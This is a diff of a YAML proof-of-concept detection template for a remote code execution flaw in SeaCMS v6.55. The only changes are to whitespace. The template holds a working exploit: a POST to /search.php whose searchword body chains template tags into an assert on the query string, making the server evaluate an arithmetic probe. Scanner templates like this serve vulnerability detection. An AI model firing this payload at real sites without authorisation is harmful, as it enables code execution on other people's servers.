@@ -1,7 +1,7 @@
 name: poc-yaml-seacms-rce
 set:
-  r: randomInt(800000000, 1000000000)
-  r1: randomInt(800000000, 1000000000)
+  r: randomInt(800000000,1000000000)
+  r1: randomInt(800000000,1000000000)
 rules:
   - method: POST
     path: "/search.php?print({{r}}%2b{{r1}})"
@@ -10,7 +10,7 @@ rules:
     body: |
       searchtype=5&searchword={if{searchpage:year}&year=:as{searchpage:area}}&area=s{searchpage:letter}&letter=ert{searchpage:lang}&yuyan=($_SE{searchpage:jq}&jq=RVER{searchpage:ver}&&ver=[QUERY_STRING]));/*
     expression: |
-      response.status==200 && response.body.bcontains(bytes(string(r+r1)))
+      response.status == 200 && response.body.bcontains(bytes(string(r + r1)))
 detail:
   author: neverendxxxxxx(https://github.com/neverendxxxxxx),violin
   seacms: v6.55
